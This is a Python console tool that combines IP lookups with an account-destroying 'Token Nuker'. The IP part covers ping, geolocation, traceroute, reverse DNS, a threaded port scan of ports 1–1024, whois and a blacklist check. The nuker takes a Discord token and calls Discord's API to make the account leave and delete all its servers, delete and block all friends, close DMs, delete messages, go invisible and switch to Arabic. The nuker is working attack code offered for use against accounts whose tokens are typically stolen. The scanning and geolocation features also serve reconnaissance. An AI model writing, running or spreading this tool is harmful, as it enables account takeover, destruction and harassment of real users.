import subprocess
import requests
import socket
import platform
import concurrent.futures
from pystyle import Colors, Colorate, Center
import time

def ping_ip(ip_address):
    try:
        result = subprocess.run(['ping', ip_address], capture_output=True, text=True, timeout=10)
        print(Colorate.Horizontal(Colors.red_to_blue, f"\n{'=' * 60}\nPINGING {ip_address}\n{'=' * 60}"))
        print(result.stdout)
    except subprocess.TimeoutExpired:
        print(Colorate.Horizontal(Colors.red_to_blue, "Timeout expired. No response received."))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"An error occurred: {e}"))

def get_ip_information(ip_address):
    try:
        api_key = 'your_ipgeolocation_api_key'
        response = requests.get(f"https://api.ipgeolocation.io/ipgeo?apiKey={api_key}&ip={ip_address}").json()
        
        print(Colorate.Horizontal(Colors.red_to_blue, f"\n{'=' * 60}\nIP Information\n{'=' * 60}"))
        
        info_to_display = {
            "IP Address": response.get("ip"),
            "Continent": f"{response.get('continent_name')} ({response.get('continent_code')})",
            "Country": f"{response.get('country_name')} ({response.get('country_code3')})",
            "Region": response.get("state_prov"),
            "City": response.get("city"),
            "Postal Code": response.get("zipcode") if response.get("zipcode") else "Not available",
            "Latitude": response.get("latitude"),
            "Longitude": response.get("longitude"),
            "Time Zone": format_timezone(response.get('time_zone')),
            "ISP": response.get("isp"),
            "Organization": response.get("organization"),
        }

        for key, value in info_to_display.items():
            if value:
                print(Colorate.Horizontal(Colors.red_to_blue, f"{key}: {value}"))

    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"An error occurred: {e}"))

def format_timezone(timezone_info):
    if timezone_info:
        return f"{timezone_info.get('name')} (UTC{timezone_info.get('offset')})"
    else:
        return ""

def traceroute_ip(ip_address):
    try:
        command = ['tracert', ip_address] if platform.system().lower() == "windows" else ['traceroute', ip_address]
        result = subprocess.run(command, capture_output=True, text=True)
        print(Colorate.Horizontal(Colors.red_to_blue, f"\n{'=' * 60}\nTRACEROUTE {ip_address}\n{'=' * 60}"))
        print(result.stdout)
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"An error occurred: {e}"))

def reverse_dns_lookup(ip_address):
    try:
        result = subprocess.run(['nslookup', ip_address], capture_output=True, text=True)
        print(Colorate.Horizontal(Colors.red_to_blue, f"\n{'=' * 60}\nREVERSE DNS LOOKUP {ip_address}\n{'=' * 60}"))
        print(result.stdout)
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"An error occurred: {e}"))

def scan_port(ip_address, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((ip_address, port))
        sock.close()
        return port if result == 0 else None
    except Exception:
        return None

def port_scan(ip_address):
    open_ports = []
    print(Colorate.Horizontal(Colors.red_to_blue, f"Scanning ports on {ip_address}... This may take a while."))
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        futures = {executor.submit(scan_port, ip_address, port): port for port in range(1, 1025)}
        for future in concurrent.futures.as_completed(futures):
            port = futures[future]
            if future.result():
                open_ports.append(port)
                print(Colorate.Horizontal(Colors.red_to_blue, f"Port {port} is open"))

    print(Colorate.Horizontal(Colors.red_to_blue, f"\n{'=' * 60}\nOPEN PORTS ON {ip_address}\n{'=' * 60}"))
    print(Colorate.Horizontal(Colors.red_to_blue, f"Open ports: {open_ports}"))

def whois_lookup(ip_address):
    try:
        import whois
        result = whois.whois(ip_address)
        print(Colorate.Horizontal(Colors.red_to_blue, f"\n{'=' * 60}\nWHOIS LOOKUP {ip_address}\n{'=' * 60}"))
        print(Colorate.Horizontal(Colors.red_to_blue, str(result)))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"An error occurred: {e}"))

def blacklist_check(ip_address):
    try:
        response = requests.get(f"https://api.abuseipdb.com/api/v2/check?ipAddress={ip_address}", headers={
            'Key': 'your_abuseipdb_api_key', 
            'Accept': 'application/json'
        }).json()
        print(Colorate.Horizontal(Colors.red_to_blue, f"\n{'=' * 60}\nBLACKLIST CHECK {ip_address}\n{'=' * 60}"))
        print(Colorate.Horizontal(Colors.red_to_blue, str(response)))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"An error occurred: {e}"))

def main_menu():
    menu_options = [
        '1) Ping IP',
        '2) IP Information',
        '3) Traceroute',
        '4) Reverse DNS Lookup',
        '5) Port Scan',
        '6) Whois Lookup',
        '7) Blacklist Check',
        '8) Token Nuker',
        '9) Exit'
    ]

    num_columns = 3
    column_width = 30
    
    num_rows = (len(menu_options) + num_columns - 1) // num_columns
    
    menu_lines = []
    for row in range(num_rows):
        line_items = []
        for col in range(num_columns):
            index = row + col * num_rows
            if index < len(menu_options):
                line_items.append(f"{menu_options[index]:<{column_width}}")
        menu_lines.append(' '.join(line_items))

    for line in menu_lines:
        print(Colorate.Horizontal(Colors.red_to_blue, line))

def banner():
    print(Colorate.Horizontal(Colors.blue_to_cyan, r"""


888b     d888  .d88888b.   .d88888b.  8888888b.  88888888888  .d88888b.   .d88888b.  888       .d8888b.  
8888b   d8888 d88P" "Y88b d88P" "Y88b 888  "Y88b     888     d88P" "Y88b d88P" "Y88b 888      d88P  Y88b 
88888b.d88888 888     888 888     888 888    888     888     888     888 888     888 888      Y88b.      
888Y88888P888 888     888 888     888 888    888     888     888     888 888     888 888       "Y888b.   
888 Y888P 888 888     888 888     888 888    888     888     888     888 888     888 888          "Y88b. 
888  Y8P  888 888     888 888     888 888    888     888     888     888 888     888 888            "888 
888   "   888 Y88b. .d88P Y88b. .d88P 888  .d88P     888     Y88b. .d88P Y88b. .d88P 888      Y88b  d88P 
888       888  "Y88888P"   "Y88888P"  8888888P"      888      "Y88888P"   "Y88888P"  88888888  "Y8888P"  
                                                                                                         
                                                                                                         
                                                                                                         

    """))

def authenticate(token):
    headers = {"Authorization": f"{token}"}
    return headers

def Nuke_account(token):
    print(Colorate.Horizontal(Colors.blue_to_cyan, "Nuking account..."))
    leaveServers(token)
    deleteFriends(token)
    deleteServers(token)
    close_all_dms(token)
    blockAllFriends(token)
    deleteMessages(token)
    changeStatus(token)
    changeLanguageToArabic(token)


def leaveServers(token):
    print("Leaving servers...")
    headers = authenticate(token)
    
    response = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers)
    
    if response.status_code != 200:
        print(f"Failed to fetch guilds: {response.status_code}")
        print(response.text)
        return
    
    guilds = response.json()
    
    print("Raw guilds data:", guilds)
    
    if isinstance(guilds, list):
        for guild in guilds:
            if isinstance(guild, dict):
                guild_id = guild.get('id')
                if guild_id:
                    delete_response = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{guild_id}", headers=headers)
                    
                    if delete_response.status_code == 204:
                        print(f"Successfully left server {guild_id}")
                    elif delete_response.status_code == 429:
                        retry_after = delete_response.json().get('retry_after', 1)
                        print(f"Rate limited. Waiting for {retry_after} seconds before retrying.")
                        time.sleep(retry_after)
                        # Retry the request after waiting
                        delete_response = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{guild_id}", headers=headers)
                        if delete_response.status_code == 204:
                            print(f"Successfully left server {guild_id} after retry.")
                        else:
                            print(f"Failed to leave server {guild_id} on retry: {delete_response.status_code} - {delete_response.text}")
                    else:
                        print(f"Failed to leave server {guild_id}: {delete_response.status_code} - {delete_response.text}")
                else:
                    print(f"No ID found for guild: {guild}")
            else:
                print(f"Expected dict, but got: {type(guild)} - {guild}")
    else:
        print(f"Expected list, but got: {type(guilds)} - {guilds}")

    print(Colorate.Horizontal(Colors.blue_to_cyan, "Attempted to leave all servers."))

def deleteFriends(token):
    print("Deleting friends...")
    headers = authenticate(token)
    friends = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers).json()
    for friend in friends:
        requests.delete(f"https://discord.com/api/v9/users/@me/relationships/{friend['id']}", headers=headers)
    print(Colorate.Horizontal(Colors.blue_to_cyan, "Deleted all friends."))

def deleteServers(token):
    print(Colorate.Horizontal(Colors.blue_to_cyan, "Deleting servers..."))
    headers = authenticate(token)
    
    # Fetch the list of guilds
    response = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers)
    
    if response.status_code != 200:
        print(f"Failed to fetch guilds: {response.status_code}")
        print(response.text)
        return
    
    guilds = response.json()

    # Debug: Print the structure of guilds
    print("Raw guilds data:", guilds)

    if isinstance(guilds, list):
        for guild in guilds:
            if isinstance(guild, dict):
                guild_id = guild.get('id')
                if guild_id:
                    delete_response = requests.delete(f"https://discord.com/api/v9/guilds/{guild_id}", headers=headers)
                    if delete_response.status_code == 204:
                        print(f"Successfully deleted guild {guild_id}")
                    else:
                        print(f"Failed to delete guild {guild_id}: {delete_response.status_code}")
                else:
                    print(f"No ID found for guild: {guild}")
            else:
                print(f"Expected dict, but got: {type(guild)} - {guild}")
    else:
        print(f"Expected list, but got: {type(guilds)} - {guilds}")

    print(Colorate.Horizontal(Colors.blue_to_cyan, "Attempted to delete all servers."))

def close_all_dms(token):
    print(Colorate.Horizontal(Colors.blue_to_cyan, "Closing DMs..."))
    headers = authenticate(token)
    dms = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers).json()
    for dm in dms:
        requests.delete(f"https://discord.com/api/v9/channels/{dm['id']}", headers=headers)
    print(Colorate.Horizontal(Colors.blue_to_cyan, "Closed all DMs."))

def blockAllFriends(token):
    print(Colorate.Horizontal(Colors.blue_to_cyan, "Blocking friends..."))
    headers = authenticate(token)
    friends = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers).json()
    for friend in friends:
        payload = {"type": 2}
        requests.put(f"https://discord.com/api/v9/users/@me/relationships/{friend['id']}", headers=headers, json=payload)
    print(Colorate.Horizontal(Colors.blue_to_cyan, "Blocked all friends."))

def deleteMessages(token):
    print(Colorate.Horizontal(Colors.blue_to_cyan, "Deleting messages..."))
    headers = authenticate(token)
    channels = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers).json()
    for channel in channels:
        messages = requests.get(f"https://discord.com/api/v9/channels/{channel['id']}/messages", headers=headers).json()
        for message in messages:
            requests.delete(f"https://discord.com/api/v9/channels/{channel['id']}/messages/{message['id']}", headers=headers)
    print(Colorate.Horizontal(Colors.blue_to_cyan, "Deleted all messages."))

def changeStatus(token):
    print(Colorate.Horizontal(Colors.blue_to_cyan, "Changing status..."))
    headers = authenticate(token)
    status_payload = {"status": "invisible"}
    requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=status_payload)
    print(Colorate.Horizontal(Colors.blue_to_cyan, "Changed status to invisible."))

def changeLanguageToArabic(token):
    print(Colorate.Horizontal(Colors.blue_to_cyan, "Changing language to Arabic..."))
    headers = authenticate(token)
    language_payload = {"locale": "ar"}
    requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=language_payload)
    print(Colorate.Horizontal(Colors.blue_to_cyan, "Language changed to Arabic."))

if __name__ == "__main__":
    while True:
        banner()
        main_menu()
        
        try:
            choice = int(input(Colorate.Horizontal(Colors.red_to_blue, "\nSelect an option: ")))
        except ValueError:
            print(Colorate.Horizontal(Colors.red_to_blue, "Invalid input. Please enter a number between 1 and 9."))
            continue
        
        if choice == 1:
            ip = input(Colorate.Horizontal(Colors.red_to_blue, "Enter IP address: "))
            ping_ip(ip)
        elif choice == 2:
            ip = input(Colorate.Horizontal(Colors.red_to_blue, "Enter IP address: "))
            get_ip_information(ip)
        elif choice == 3:
            ip = input(Colorate.Horizontal(Colors.red_to_blue, "Enter IP address: "))
            traceroute_ip(ip)
        elif choice == 4:
            ip = input(Colorate.Horizontal(Colors.red_to_blue, "Enter IP address: "))
            reverse_dns_lookup(ip)
        elif choice == 5:
            ip = input(Colorate.Horizontal(Colors.red_to_blue, "Enter IP address: "))
            port_scan(ip)
        elif choice == 6:
            ip = input(Colorate.Horizontal(Colors.red_to_blue, "Enter IP address: "))
            whois_lookup(ip)
        elif choice == 7:
            ip = input(Colorate.Horizontal(Colors.red_to_blue, "Enter IP address: "))
            blacklist_check(ip)
        elif choice == 8:
            token = input(Colorate.Horizontal(Colors.red_to_blue, "Enter Discord token: "))
            Nuke_account(token)
        elif choice == 9:
            break
        else:
            print(Colorate.Horizontal(Colors.red_to_blue, "Invalid choice. Please try again."))
        time.sleep(2)
